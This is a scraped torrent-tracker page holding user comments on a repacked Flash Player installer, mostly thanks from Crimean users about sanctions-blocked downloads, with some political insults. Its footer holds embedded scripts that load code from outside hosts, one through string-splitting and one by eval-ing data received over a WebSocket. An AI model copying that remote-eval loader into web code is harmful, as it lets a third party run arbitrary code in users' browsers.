+На самом деле есть VPN программы, через которые можно спокойно посещать те сайты и пользоваться теми ресурсами, на которых санкции. Но за обновлялку флеш - СПАСИБО! </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Alexey_</b></td> <td>15-07-2015 12:07:57 (34 месяца назад)</td> <td></td> <td align="right"><span id="c_2530622"></span><script type="text/javascript">cOptions(135840,2530622);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />да вы ребята ваще без рук и без желания понимать.....не стыдно?<br />
+КРУПНЫЕ КОМПАНИИ РЕШАЮТ ОТКАЗАТЬСЯ ОТ ТЕХНОЛОГИИ FLASH (и перейти на HTML 5)<br />
+если интересно то полную статью найдёте тут:<br />
+http://hi-news.ru/software/krupnye-kompanii-reshayut-otkazatsya-ot-texnologii-flash.html<br />
+для тех кто ищет более новую версию от первых рук так сказать то скачать можете тут ОФФИЦАЛЬНО (БЕЗ ПОСРЕДНИКОВ И САМОЕ НОВОЕ) : http://labs.adobe.com/downloads/flashplayer.html<br />
+я неслышал о блокировке может у вас хост заражён, просто сменили через ZenMate (сам пробовал - проверено) на другую страну все возможные и не возможные разширения тут: https://chrome.google.com/webstore/search/vpn?hl=ru&amp;_category=extensions<br />
+сменили и скачали.<br />
+для ленивых как всегда - сборка.всё для вас сделали (может и код вставили но простому пользователю всё равно.... и это реально пугает)<br />
+народ вы попу шкуркой на 20 вытераете? если нет то по количеству скачки - запаситесь...<br />
+или просто изучите что к чему - это куда проще чем стоять устанка, сидеть на касе , ездить на машине , приготовить блюдо , поченить машину , отвечать на звонки, сидеть в школе , играть в игру)) и даже перебить операционную систему linux,mac,windows (вроде всё что перечислил довольно простое и из жизни) если теряете часть времени около компа то нужно разбераться ...</fieldset><br />
+<br />
+Видимо кто-то просто не вкурсе, что на Крым наложили санкции и умничает не зная сути проблемы. У нас  закрыли доступ такие к примеру компании, как гугл и теперь не браузером, не всякими финтифлюшками типо гугл плей или интернет-магазин гугла - не попользуешься, находясь на полуострове. Инфы об этом полно в инете, ознакомься, пред тем, как людей за дураков круглых держать.<br />
+<br />
+Я же ниже описывал ситуацию, как с хромом мучился. Даже просил скачать подругу из мск, чтобы она мне установочный файл гугла, скаченный у себя, скинула. Не устанавливается никак. Только к инету подключаешься, сразу определяет откуда ты используешь его.<br />
+<br />
+Читая комментарии людей, не показалось случайным, что практически все эти города, озвученные ими - крымские ?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>botancik</b></td> <td>15-07-2015 10:21:13 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2530568"></span><script type="text/javascript">cOptions(441231,2530568);</script></td></tr><tr><td class="c_t" colspan=4>да вы ребята ваще без рук и без желания понимать.....не стыдно?<br />
+КРУПНЫЕ КОМПАНИИ РЕШАЮТ ОТКАЗАТЬСЯ ОТ ТЕХНОЛОГИИ FLASH (и перейти на HTML 5)<br />
+если интересно то полную статью найдёте тут:<br />
+ http://hi-news.ru/software/krupnye-kompanii-reshayut-otkazatsya-ot-texnologii-flash.html<br />
+для тех кто ищет более новую версию от первых рук так сказать то скачать можете тут ОФФИЦАЛЬНО (БЕЗ ПОСРЕДНИКОВ И САМОЕ НОВОЕ) : http://labs.adobe.com/downloads/flashplayer.html<br />
+я неслышал о блокировке может у вас хост заражён, просто сменили через ZenMate (сам пробовал - проверено) на другую страну все возможные и не возможные разширения тут: https://chrome.google.com/webstore/search/vpn?hl=ru&amp;_category=extensions<br />
+сменили и скачали.<br />
+для ленивых как всегда - сборка.всё для вас сделали (может и код вставили но простому пользователю всё равно.... и это реально пугает)<br />
+народ вы попу шкуркой на 20 вытераете? если нет то по количеству скачки - запаситесь...<br />
+или просто изучите что к чему - это куда проще чем стоять устанка, сидеть на касе , ездить на машине , приготовить блюдо , поченить машину , отвечать на звонки, сидеть в школе , играть в игру)) и даже перебить операционную систему linux,mac,windows (вроде всё что перечислил довольно простое и из жизни) если теряете часть времени около компа то нужно разбераться ... </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Alexey_</b></td> <td>15-07-2015 9:20:40 (34 месяца назад)</td> <td>Оценил на: <b>9</b></td> <td align="right"><span id="c_2530543"></span><script type="text/javascript">cOptions(135840,2530543);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Севастополя!) С Летчиков)<br />
+Решили нас проучить санкциями, попуасы. Когда Хром обрубили, сначала матерился долго, ибо пользовался одной учеткой со всех устройств своих. Скачать удалось с левого айпи, а установщик все-равно не захотел устанавливаться. Пробовал устаревшие версии, да уведомления достали о старой версии. Перешел на Яндекс-браузер и не жалею. Потом уже нашел тут на сайте и Хром новый, да только уже поздно. Привык к другому. Да и зачем пользоваться тем, что нам запрещают? Нельзя скачивать? Ну и идите пиндоские жополизники кобыле в трещину!) Мы Родину за цацки заморские не предадим)<br />
+Спасибо.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ruslan_miller</b></td> <td>15-07-2015 3:23:38 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2530476"></span><script type="text/javascript">cOptions(1290696,2530476);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Запорожья, Украина.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Leshij2009</b></td> <td>15-07-2015 1:47:32 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2530455"></span><script type="text/javascript">cOptions(1364450,2530455);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо огромное от Крыма:)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ommanepadmehum</b></td> <td>15-07-2015 0:19:01 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2530416"></span><script type="text/javascript">cOptions(50035,2530416);</script></td></tr><tr><td class="c_t" colspan=4>Обновлена. Спасибо из Ялты</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kaktyz48</b></td> <td>14-07-2015 21:44:37 (34 месяца назад)</td> <td>Оценил на: <b>9</b></td> <td align="right"><span id="c_2530315"></span><script type="text/javascript">cOptions(1197031,2530315);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо. Все работает, цем цем </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sheet2006</b></td> <td>11-07-2015 20:43:31 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2528000"></span><script type="text/javascript">cOptions(302057,2528000);</script></td></tr><tr><td class="c_t" colspan=4>спасибо, скачал и установил...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Tvorec</b></td> <td>04-07-2015 9:43:58 (35 месяцев назад)</td> <td></td> <td align="right"><span id="c_2522295"></span><script type="text/javascript">cOptions(81824,2522295);</script></td></tr><tr><td class="c_t" colspan=4>Севастополь с благодарностью. <br />
+Через прокси замарачиваться не хочется</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>77sergej</b></td> <td>04-07-2015 1:00:07 (35 месяцев назад)</td> <td></td> <td align="right"><span id="c_2522168"></span><script type="text/javascript">cOptions(1360487,2522168);</script></td></tr><tr><td class="c_t" colspan=4>Керчь с благодарностью к раздающему, fuck you Obama! Кстати, для всех параноиков ( не в обиду ), считающих что торренты прикроют - скачайте себе архив магнитных ссылок, к примеру, рутрекера и не парьтесь больше по этому поводу. Архив всего-то 2.62 Гб, а то чем черт не шутит - вдруг действительно копирасты достанут ))) Зато вряд ли доберутся до DHT-сети. </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sevn73</b></td> <td>03-07-2015 12:51:02 (35 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2521718"></span><script type="text/javascript">cOptions(151375,2521718);</script></td></tr><tr><td class="c_t" colspan=4>Севастополь так же благодарит!)))+100500</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>nvd5</b></td> <td>02-07-2015 13:43:14 (35 месяцев назад)</td> <td></td> <td align="right"><span id="c_2521044"></span><script type="text/javascript">cOptions(369037,2521044);</script></td></tr><tr><td class="c_t" colspan=4>Ялта и Гурзуф говорят спасибо.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>alexandrov.anat</b></td> <td>24-06-2015 16:36:38 (35 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2515820"></span><script type="text/javascript">cOptions(844821,2515820);</script></td></tr><tr><td class="c_t" colspan=4><b>froze 312</b> -А Вы на каком провайдере? Я на &quot;Севстаре&quot; тоже скачать не могу-пишет, что мой, якобы антивирусник (которрого у меня уже лет шесть как нет)блокирует возможность закачки...Раздатчику обновления персональное <b>Спасибо! </b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>24-06-2015 2:40:01 (35 месяцев назад)</td> <td></td> <td align="right"><span id="c_2515570"></span><script type="text/javascript">cOptions(817041,2515570);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо Вам Большое за обновку!!! <img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>serg1365</b></td> <td>10-06-2015 13:26:32 (35 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2506979"></span><script type="text/javascript">cOptions(723955,2506979);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо за раздачу-уже обновил.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>dooh_dooh</b></td> <td>21-05-2015 14:12:32 (36 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2491710"></span><script type="text/javascript">cOptions(852024,2491710);</script></td></tr><tr><td class="c_t" colspan=4>Я из Симферополя. Хотел обновить плеер, но на офф сайте нет загрузки. Спасибо за то что выложили! </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>froze 312</b></td> <td>14-05-2015 19:34:40 (36 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2485123"></span><script type="text/javascript">cOptions(645428,2485123);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br /><b>Impress1349</b> 		<br />
+В Крыму прикрыта лавочка с официальными сайтами. Теперь даже Flash player через торрент качать(</fieldset><br />
+<fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br /><b>sheet2006</b> 		<br />
+спасибо, а в Крыму уже не скачать плеер, и слух ходит что торренты прикроют</fieldset><br />
+Ни чё не прикрыли. Зашёл на офф сайт, выбрал русский язык (предлагался укр.) и спокойно скачал. И Рутор пока без проблем работает. Не пугайте так! <img src="http://s.rutor.info/t/smilies/nono.gif" /><br />
+Сам из Севастополя буду. <img src="http://s.rutor.info/t/smilies/smile1.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sheet2006</b></td> <td>25-04-2015 8:54:09 (37 месяцев назад)</td> <td></td> <td align="right"><span id="c_2463666"></span><script type="text/javascript">cOptions(302057,2463666);</script></td></tr><tr><td class="c_t" colspan=4>спасибо, а в Крыму уже не скачать плеер, и слух ходит что торренты прикроют</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>BЭNDЭR</b></td> <td>14-04-2015 17:24:35 (37 месяцев назад)</td> <td></td> <td align="right"><span id="c_2436911"></span><script type="text/javascript">cOptions(804330,2436911);</script></td></tr><tr><td class="c_t" colspan=4>Пасиба!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>aromaboy</b></td> <td>14-04-2015 17:13:03 (37 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2436893"></span><script type="text/javascript">cOptions(804682,2436893);</script></td></tr><tr><td class="c_t" colspan=4>тот самый момент, когда узнаешь об обнове не из браузера)))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pama9</b></td> <td>19-03-2015 20:42:54 (38 месяцев назад)</td> <td></td> <td align="right"><span id="c_2409682"></span><script type="text/javascript">cOptions(670207,2409682);</script></td></tr><tr><td class="c_t" colspan=4><b>Impress1349</b> держись братела, главное чтобы торенты не прикрыли :)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Impress1349</b></td> <td>25-02-2015 20:58:54 (39 месяцев назад)</td> <td></td> <td align="right"><span id="c_2385622"></span><script type="text/javascript">cOptions(1274033,2385622);</script></td></tr><tr><td class="c_t" colspan=4>В Крыму прикрыта лавочка с официальными сайтами. Теперь даже Flash player через торрент качать(</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pirat59</b></td> <td>24-01-2015 18:24:09 (40 месяцев назад)</td> <td></td> <td align="right"><span id="c_2351523"></span><script type="text/javascript">cOptions(991802,2351523);</script></td></tr><tr><td class="c_t" colspan=4>извиняюсь не заметил, я просто тихую установку делаю всегда</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pama9</b></td> <td>23-01-2015 12:50:11 (40 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2350122"></span><script type="text/javascript">cOptions(670207,2350122);</script></td></tr><tr><td class="c_t" colspan=4><b>pirat59</b> всё на месте.<br />
+<a href="http://fastpic.ru/view/58/2015/0123/7a02a2e45cb9e9e1b1fcbce8f5dd4a9b.jpg.html" target="_blank"><img src="http://i58.fastpic.ru/thumb/2015/0123/9b/7a02a2e45cb9e9e1b1fcbce8f5dd4a9b.jpeg" /></a><br />
+<br />
+... походу вас сбило столку это описание из шапки(возможно от другой раздачи):<br />
+Дополнительная информация:<br />
+install_flash_player_ax.exe - Active-X для Windows (для браузера Internet Explorer)<br />
+install_flash_player.exe - плагин для Windows (для всех остальных браузеров)<br />
+uninstall_flash_player.exe - деинсталлятор для Windows (для всех браузеров) </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pirat59</b></td> <td>23-01-2015 11:18:16 (40 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2350056"></span><script type="text/javascript">cOptions(991802,2350056);</script></td></tr><tr><td class="c_t" colspan=4>деинсталлятор забыли запихнуть</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>20-01-2015 7:46:48 (40 месяцев назад)</td> <td></td> <td align="right"><span id="c_2346946"></span><script type="text/javascript">cOptions(805410,2346946);</script></td></tr><tr><td class="c_t" colspan=4><b>Особенности RePack by D!akov</b>:<br />
+<li>Версии для AOL, Firefox, Mozilla, Netscape, Opera, Internet Explorer и платформы Chromium в одном инсталляторе!<br />
+<li>Интегрирован деинсталлятор предыдущих версий.</li></li></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>lords666</b></td> <td>19-01-2015 17:15:14 (40 месяцев назад)</td> <td></td> <td align="right"><span id="c_2346414"></span><script type="text/javascript">cOptions(249919,2346414);</script></td></tr><tr><td class="c_t" colspan=4>поясните пожалуйста, что значит 3 в 1?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>demonhare</b></td> <td>14-01-2015 19:02:45 (40 месяцев назад)</td> <td></td> <td align="right"><span id="c_2341251"></span><script type="text/javascript">cOptions(265893,2341251);</script></td></tr><tr><td class="c_t" colspan=4><b>Cuper13</b><br />
+при чём здесь хром ??? O_o<br />
+это официальная страница загрузок<br />
+для разных операционок !!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Cuper13</b></td> <td>14-01-2015 5:47:57 (40 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2340618"></span><script type="text/javascript">cOptions(140012,2340618);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />demonhare			<br />
+вот здесь можно скачать флэш-плеер:<br />
+</fieldset><br />
+Да, да, и Хром в придачу, а мне он и нах... не нужен</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ox77777</b></td> <td>13-11-2014 18:43:31 (42 месяца назад)</td> <td></td> <td align="right"><span id="c_2279556"></span><script type="text/javascript">cOptions(244759,2279556);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Битый Пиксель	12-11-2014 1:15:06 (2 дня назад)	Оценил на: 10	<br />
+Что ж вы за нубьё дремучее?! Все там нормально снимается, нечего на Дьякова наговаривать, все всегда на уровне!</fieldset><br />
+Да я не наговариваю. Просто в последнее время вижу, что везде надо не забыть снять галочку.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ox77777</b></td> <td>11-11-2014 17:24:34 (42 месяца назад)</td> <td></td> <td align="right"><span id="c_2276905"></span><script type="text/javascript">cOptions(244759,2276905);</script></td></tr><tr><td class="c_t" colspan=4>А что теперь специально от постороннего софта не избавляются релизёры?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Sledgehammer</b></td> <td>12-06-2014 5:00:22 (48 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2169090"></span><script type="text/javascript">cOptions(1051046,2169090);</script></td></tr><tr><td class="c_t" colspan=4>Зачет) +10</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tatunserg</b></td> <td>28-05-2014 8:37:10 (48 месяцев назад)</td> <td></td> <td align="right"><span id="c_2160226"></span><script type="text/javascript">cOptions(573692,2160226);</script></td></tr><tr><td class="c_t" colspan=4>кстати флеш плеер обновляется вместе с браузером.я тоже раньше мучался с ним,а потом заметил.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>BЭNDЭR</b></td> <td>18-05-2014 14:04:58 (48 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2152675"></span><script type="text/javascript">cOptions(804330,2152675);</script></td></tr><tr><td class="c_t" colspan=4>Большое спасибо за обновление Флеш-плейера! Через официальный сайт у меня не обновляется! ( не проходит 50% инициализации ). Чего только не делал - бесполезно! А тут успешно встал! Всё работает. )))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kent3</b></td> <td>28-04-2014 18:26:11 (49 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2141375"></span><script type="text/javascript">cOptions(1064931,2141375);</script></td></tr><tr><td class="c_t" colspan=4>да и сайт не плохой.спасибо.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>S.E.M.fortuna</b></td> <td>12-04-2014 12:45:39 (50 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2130597"></span><script type="text/javascript">cOptions(699435,2130597);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо за обновление. А кому он не нужен, проходите мимо молча. У меня вот никаким образом Adobe Flash Player не ставиться через инет, только обновляя через RUTOR.org.Так и живём.<br />
+Автору спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Pesticide</b></td> <td>09-04-2014 20:05:52 (50 месяцев назад)</td> <td></td> <td align="right"><span id="c_2128667"></span><script type="text/javascript">cOptions(972973,2128667);</script></td></tr><tr><td class="c_t" colspan=4>спасибо за обнову!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>АО</b></td> <td>29-03-2014 10:26:18 (50 месяцев назад)</td> <td></td> <td align="right"><span id="c_2118486"></span><script type="text/javascript">cOptions(634882,2118486);</script></td></tr><tr><td class="c_t" colspan=4>govnorip11	20-02-2014 17:40:41 (1 месяц назад)	Оценил на: 1	<br />
+да уж, репак флешплеера..<br />
+Только 4 ссылка БЕЗ вируса...<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>7ВИН7</b></td> <td>20-02-2014 20:34:10 (51 месяц назад)</td> <td></td> <td align="right"><span id="c_2089440"></span><script type="text/javascript">cOptions(949190,2089440);</script></td></tr><tr><td class="c_t" colspan=4>Мда...У <b>D!akovа</b> времени видимо свободного дохрена, <b>Flash</b>  репачить! Бред какой то!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>govnorip11</b></td> <td>20-02-2014 19:16:24 (51 месяц назад)</td> <td></td> <td align="right"><span id="c_2089373"></span><script type="text/javascript">cOptions(188881,2089373);</script></td></tr><tr><td class="c_t" colspan=4>вот, кстати, ссылка для проверки, какая версия установлена, а сверху ссыль ведет не туда<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">какая версия установлена</div><div class="hidebody"></div><textarea class="hidearea"><br />
+http://www.adobe.com/software/flash/about/<br />
+</textarea></div></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>15-01-2014 11:22:48 (52 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2059247"></span><script type="text/javascript">cOptions(817041,2059247);</script></td></tr><tr><td class="c_t" colspan=4>А чего плохого в том,что человек делает ссылку на свои Репаки?!Я сам лично иногда скачиваю у него на сайте программки.Кстати и не плохие!За этот плагин Большое Спасибо!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Pesticide</b></td> <td>21-12-2013 17:33:51 (53 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2038789"></span><script type="text/javascript">cOptions(972973,2038789);</script></td></tr><tr><td class="c_t" colspan=4>спасибо, всегда актуально.<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
